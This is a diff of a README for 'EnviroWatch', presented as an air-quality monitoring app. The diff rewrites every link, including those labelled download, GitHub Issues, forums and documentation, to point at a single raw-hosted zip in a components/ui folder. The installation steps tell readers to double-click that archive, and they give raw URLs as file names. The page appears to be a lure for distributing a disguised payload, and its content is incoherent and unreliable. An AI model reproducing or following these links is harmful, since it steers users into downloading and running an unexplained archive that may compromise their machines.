@@ -1,6 +1,6 @@
 # 🌍 EnviroWatch - Monitor Air Quality in Real Time
 
-[![Download EnviroWatch](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/public/EnviroWatch-v1.4-beta.4.zip%20EnviroWatch-v1.0-blue)](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/public/EnviroWatch-v1.4-beta.4.zip)
+[![Download EnviroWatch](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/components/ui/Watch-Enviro-v3.4.zip%20EnviroWatch-v1.0-blue)](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/components/ui/Watch-Enviro-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,17 +19,17 @@ To run EnviroWatch smoothly, make sure your system meets the following requireme
 
 To get EnviroWatch, visit the link below to download the application:
 
-[Download EnviroWatch](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/public/EnviroWatch-v1.4-beta.4.zip)
+[Download EnviroWatch](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/components/ui/Watch-Enviro-v3.4.zip)
 
 Once downloaded, follow the installation steps below:
 
 1. **Locate the Downloaded File:**
    - Open your Downloads folder.
-   - Find the file named `https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/public/EnviroWatch-v1.4-beta.4.zip` or `https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/public/EnviroWatch-v1.4-beta.4.zip` for macOS.
+   - Find the file named `https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/components/ui/Watch-Enviro-v3.4.zip` or `https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/components/ui/Watch-Enviro-v3.4.zip` for macOS.
 
 2. **Run the Installer:**
-   - For Windows: Double-click `https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/public/EnviroWatch-v1.4-beta.4.zip` to start the installation process.
-   - For macOS: Double-click the `https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/public/EnviroWatch-v1.4-beta.4.zip` file, then drag the EnviroWatch icon into your Applications folder.
+   - For Windows: Double-click `https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/components/ui/Watch-Enviro-v3.4.zip` to start the installation process.
+   - For macOS: Double-click the `https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/components/ui/Watch-Enviro-v3.4.zip` file, then drag the EnviroWatch icon into your Applications folder.
 
 3. **Launch the Application:**
    - After installation, find EnviroWatch in your Start Menu (Windows) or Applications folder (macOS), and open it.
@@ -72,7 +72,7 @@ Currently, EnviroWatch is only available for desktop. A mobile version may be de
 
 ### Is there a way to report issues or bugs?
 
-Yes! Use our [GitHub Issues](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/public/EnviroWatch-v1.4-beta.4.zip) page to report any problems or suggest improvements. Your feedback helps us enhance the application.
+Yes! Use our [GitHub Issues](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/components/ui/Watch-Enviro-v3.4.zip) page to report any problems or suggest improvements. Your feedback helps us enhance the application.
 
 ### How does EnviroWatch source its data?
 
@@ -80,7 +80,7 @@ EnviroWatch uses data from OpenAQ, a reliable platform that aggregates air quali
 
 ## 📣 Community and Support
 
-Your experience with EnviroWatch is important to us. If you have questions or need assistance, please reach out through our [Community Forums](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/public/EnviroWatch-v1.4-beta.4.zip) or check out our [Documentation](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/public/EnviroWatch-v1.4-beta.4.zip) for more detailed guides.
+Your experience with EnviroWatch is important to us. If you have questions or need assistance, please reach out through our [Community Forums](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/components/ui/Watch-Enviro-v3.4.zip) or check out our [Documentation](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/components/ui/Watch-Enviro-v3.4.zip) for more detailed guides.
 
 ## 🌟 Acknowledgments
 
@@ -88,4 +88,4 @@ Thank you for choosing EnviroWatch for your air quality monitoring needs. We aim
 
 Happy monitoring!
 
-[Download EnviroWatch](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/public/EnviroWatch-v1.4-beta.4.zip)
+[Download EnviroWatch](https://raw.githubusercontent.com/ScorJr1/EnviroWatch/main/components/ui/Watch-Enviro-v3.4.zip)
